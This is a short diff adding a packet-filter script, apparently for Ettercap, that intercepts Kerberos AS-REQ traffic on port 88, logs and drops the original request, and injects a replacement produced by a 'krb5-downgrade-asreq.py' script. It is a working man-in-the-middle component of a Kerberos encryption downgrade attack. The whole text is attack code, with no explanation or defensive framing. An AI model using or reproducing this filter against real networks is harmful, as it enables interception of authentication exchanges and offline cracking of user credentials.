@@ -1,0 +1,5 @@
+if (tcp.dst == 88 && search(DATA.data, "\xa1\x03\x02\x01\x05\xa2\x03\x02\x01\x0a")) {
+	log(DATA.data, "/tmp/payload");
+	drop();
+	execinject("/usr/bin/python /tmp/krb5-downgrade-asreq.py /tmp/payload");
+}
